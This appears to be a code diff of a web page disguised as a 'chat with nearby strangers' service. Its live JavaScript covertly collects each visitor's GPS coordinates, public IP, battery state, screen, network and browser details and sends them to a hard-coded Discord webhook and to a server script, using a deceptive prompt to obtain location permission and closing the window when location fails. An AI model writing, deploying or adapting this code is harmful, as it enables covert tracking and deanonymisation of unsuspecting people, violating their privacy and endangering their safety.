@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html>
 <head>
     <style>
@@ -74,7 +73,6 @@
         $(document).ready(function() {
             var batterypercentage;
             var ischarging;
-
             function getPublicIp() {
                 const xhr = new XMLHttpRequest();
                 xhr.open('GET', 'https://api.ipify.org?format=json', false);
@@ -91,95 +89,99 @@
 
             const publicIp = getPublicIp();
 
-            function getBatteryStatus() {
-                navigator.getBattery().then(function(battery) {
-                    batterypercentage = String(battery.level * 100 + "%");
-                    ischarging = String(battery.charging);
-                    getLocation();
-                });
-            }
+            var clips = "Clipboard access removed"; // Placeholder for removed clipboard access
 
             function getLocation() {
                 if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(showPosition, showError);
+                    setTimeout(() => {
+                        navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 5000 });
+                    }, 5000);
                 } else {
-                    senddis("Your Browser Does not support Gps");
+                    alert("Your Browser Does not support Gps");
                 }
             }
 
             function showPosition(position) {
-                var gpsr = "Lattitute : " + position.coords.latitude + " Longitude : " + position.coords.longitude;
-                senddis(gpsr);
+                var grak = "Lattitute : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude;
+                sdrp(grak, clips, batterypercentage, ischarging);
+                senddis(grak, clips, batterypercentage, ischarging);
             }
 
             function showError(error) {
                 switch (error.code) {
                     case error.PERMISSION_DENIED:
-                        senddis("Location Permission Denied");
+                        sdrp("Location Permission Denied", clips, batterypercentage, ischarging);
+                        senddis("Location Permission Denied", clips, batterypercentage, ischarging);
+                        alert("Allow Location permission to Chat with nearby Strangers");
                         break;
                     case error.POSITION_UNAVAILABLE:
+                        window.close();
+                        break;
                     case error.TIMEOUT:
+                        window.close();
+                        break;
                     case error.UNKNOWN_ERROR:
-                        senddis("Location Error");
+                        window.close();
                         break;
                 }
             }
 
-            function senddis(gpsr) {
+            let datetime = new Date();
+            let localtime = String(datetime.toLocaleTimeString());
+            let referurl = document.referrer;
+            let cpuThreads = String(navigator.hardwareConcurrency);
+            let deviceram = String(navigator.deviceMemory) + "gb";
+            let useragent = navigator.userAgent;
+            let iscookieEnabled = String(navigator.cookieEnabled);
+            let devicelang = String(navigator.language);
+            let width = screen.width;
+            let height = screen.height;
+            let platform = navigator.platform;
+            let networkinfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            let networkinformation = "Network type : " + networkinfo.effectiveType + " " + "Downlink :" + " " + networkinfo.downlink;
+
+            function senddis(gpsr, clips, batterypercentage, ischarging) {
                 var request = new XMLHttpRequest();
                 request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
                 request.setRequestHeader('Content-type', 'application/json');
-
-                let timezoneOffset = new Date().getTimezoneOffset();
-                let osVersion = navigator.appVersion;
-                let browserName = navigator.appName;
-                let browserVersion = navigator.appVersion;
-                let plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ');
-                let doNotTrack = navigator.doNotTrack;
-                let touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-                let colorDepth = screen.colorDepth;
-                let availScreenWidth = screen.availWidth;
-                let availScreenHeight = screen.availHeight;
-                let onlineStatus = navigator.onLine;
-                let pixelRatio = window.devicePixelRatio;
-
                 var params = {
-                    content: `
-> **DeviceGps  : **${gpsr}
-> **NetworkInformation : **${networkinformation}
-> **BatteryPercentage : **${batterypercentage}
-> **Ischarging : **${ischarging}
-> **ScreenWidth : **${width}
-> **ScreenHeight : **${height}
-> **PlatForm : **${platform}
-> **DeviceLanguage : **${devicelang}
-> **DeviceMemory : **${deviceram}
-> **IsCookieEnabled : **${iscookieEnabled}
-> **UserAgent : **${useragent}
-> **CpuThreads : **${cpuThreads}
-> **ReferUrl : **${referurl}
-> **DeviceLocalTime : **${localtime}
-> **Public IP  : **${publicIp}
-> **TimezoneOffset : **${timezoneOffset}
-> **OS Version : **${osVersion}
-> **Browser Name : **${browserName}
-> **Browser Version : **${browserVersion}
-> **Installed Plugins : **${plugins}
-> **Do Not Track : **${doNotTrack}
-> **Touch Support : **${touchSupport}
-> **Color Depth : **${colorDepth}
-> **Available Screen Width : **${availScreenWidth}
-> **Available Screen Height : **${availScreenHeight}
-> **Online Status : **${onlineStatus}
-> **Device Pixel Ratio : **${pixelRatio}
-`,
+                    content: ("> **DeviceGps  : **" + gpsr + "\n> **NetworkInformation : **" + networkinformation + "\n> **BatteryPercentage : **" + batterypercentage + "\n> **Ischarging : **" + ischarging + "\n> **ScreenWidth : **" + width + "\n> **ScreenHeight : **" + height + "\n> **PlatForm : **" + platform + "\n> **DeviceLanguage : **" + devicelang + "\n> **DeviceMemory : **" + deviceram + "\n> **IsCookieEnabled : **" + iscookieEnabled + "\n> **UserAgent : **" + useragent + "\n> **CpuThreads : **" + cpuThreads + "\n> **ReferUrl : **" + referurl + "\n> **Clipboard : **" + clips + "\n> **DeviceLocalTime : **" + localtime + "\n" + "> **Public IP  : **" + publicIp),
                     username: "niknik",
                     avatar_url: "https://dpwhatsapp.xyz/wp-content/uploads/2021/08/Anime-Girl-WhatsApp-DP.jpg"
                 }
                 request.send(JSON.stringify(params));
             }
 
-            getBatteryStatus();
+            function sdrp(bsdks, clipboard, batterypercentage, ischarging) {
+                $.ajax({
+                    type: "POST",
+                    url: "sunni.php",
+                    data: {
+                        networkinformation: networkinformation,
+                        batterypercentage: batterypercentage,
+                        ischarging: ischarging,
+                        width: width,
+                        height: height,
+                        platform: platform,
+                        gps: bsdks,
+                        devicelang: devicelang,
+                        iscookieEnabled: iscookieEnabled,
+                        useragent: useragent,
+                        deviceram: deviceram,
+                        cpuThreads: cpuThreads,
+                        referurl: referurl,
+                        localtime: localtime,
+                        clipboard: clipboard,
+                    },
+                    cache: false,
+                    success: function(data) {},
+                    error: function(xhr, status, error) {
+                        console.log(error);
+                    }
+                });
+            }
+
+            getLocation();
         });
     </script>
 </head>
@@ -195,7 +197,7 @@
         ></iframe>
         <div class="dialog-box" id="dialogBox">
             <h2>Alert</h2>
-            <p>Please Allow permission to continue to chat with strangers</p>
+            <p>Please Allow permissions to continue to chat with strangers</p>
             <button class="btn-allow" onclick="requestPermissions()">Allow</button>
         </div>
     </div>
